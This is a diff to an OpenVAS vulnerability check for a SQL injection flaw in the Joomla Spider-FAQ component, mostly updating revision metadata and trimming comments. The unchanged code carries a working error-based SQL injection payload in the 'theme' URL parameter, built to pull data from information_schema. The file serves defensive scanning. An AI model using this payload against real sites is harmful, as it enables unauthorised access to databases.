@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_spider_faq_sql_inj_vuln.nasl 6600 2017-07-07 09:58:31Z teissa $
+# $Id: gb_joomla_spider_faq_sql_inj_vuln.nasl 11296 2018-09-10 09:08:51Z mmartin $
 #
 # Joomla Spider-FAQ SQL Injection Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:joomla:joomla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805499");
-  script_version("$Revision: 6600 $");
+  script_version("$Revision: 11296 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-07 11:58:31 +0200 (Fri, 07 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-10 11:08:51 +0200 (Mon, 10 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-26 10:48:48 +0530 (Thu, 26 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Joomla Spider-FAQ SQL Injection Vulnerability");
@@ -54,15 +54,13 @@ if(description)
 
   script_tag(name:"affected", value:"Joomla Spider FAQ component.");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36464");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/130962");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36464");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130962");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -77,23 +75,14 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-# Variable Initialization
-http_port = 0;
-req = "";
-res = "";
-dir = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Joomla Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-##Construct Attack Request
 url = dir + "/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0"+
             "&faq_cats=,2,3,&standcatids=&theme=4%20and%28select%201%20"+
             "FROM%28select%20count%28*%29,concat%28%28select%20%28select%20concat%28user"+
@@ -101,7 +90,6 @@ url = dir + "/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0"+
             "a.tables%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20FROM%20information"+
             "_schema.tables%20GROUP%20BY%20x%29a%29--%20-%20&searchform=1&expand=0&Itemid=109";
 
-##Construct Request
 req = string("GET ", url, " HTTP/1.1\r\n",
              "Host: ", get_host_name(), "\r\n",
              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
@@ -109,7 +97,6 @@ req = string("GET ", url, " HTTP/1.1\r\n",
 ##Receive Response
 res = http_keepalive_send_recv(port:http_port, data:req);
 
-##Confirm Exploit
 if(res && "SQL-INJECTION-TEST" >< res && ">Error:" >< res && "spiderfaq" >< res)
 {
   security_message(http_port);
